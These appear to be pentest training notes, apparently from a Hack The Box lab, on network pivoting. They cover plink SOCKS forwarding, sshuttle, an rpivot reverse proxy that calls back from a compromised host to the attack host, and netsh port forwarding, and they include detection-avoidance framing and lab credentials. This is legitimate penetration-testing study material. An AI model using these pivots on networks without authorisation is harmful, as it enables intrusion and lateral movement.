# SSH for Windows: plink.exe
- Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies.

```
Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer.
```
- That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.
## Getting To Know Plink
- In the below image, we have a Windows-based attack host.
![[plink.png]]
- The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. 
- This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.
#### Using Plink.exe
```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```

# SSH Pivoting with Sshuttle
- [Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains.
- However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. 
- `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. 
- We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle.
- To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
#### Running sshuttle
```shell-session
AnuragTaparia@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

- With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
```shell-session
AnuragTaparia@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

- We can now use any tool directly without using proxychains.

# Web Server Pivoting with Rpivot
- [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. 
- Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. 
- We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.
![[RPivot.png]]
- We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.
- We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.
#### Running server.py from the Attack Host
```shell-session
AnuragTaparia@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
- Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:
#### Transfering rpivot to the Target
```shell-session
AnuragTaparia@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
#### Running client.py from Pivot Target
```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

- We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
- Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.
#### Browsing to the Target Webserver using Proxychains
```shell-session
proxychains firefox-esr 172.16.5.135:80
```

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

# Port Forwarding with Windows Netsh
- [Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. 
- Here are just some of the networking related tasks we can use `Netsh` for:
	- Finding routes
	- Viewing the firewall configuration
	- Adding proxies
	- Creating port forwarding rules

- Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`,`172.16.5.25`). 
	- Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.
![[Netsh.png]]
- We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
#### Using Netsh.exe to Port Forward
```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
- always check listenaddress (it is our attack host) and connectaddress (it is the internal address which we don't have access to)
#### Verifying Port Forward
```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

- After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
```cmd-session
xfreerdp /v:10.129.15.150:8080 /u:victor /p:pass@123
```
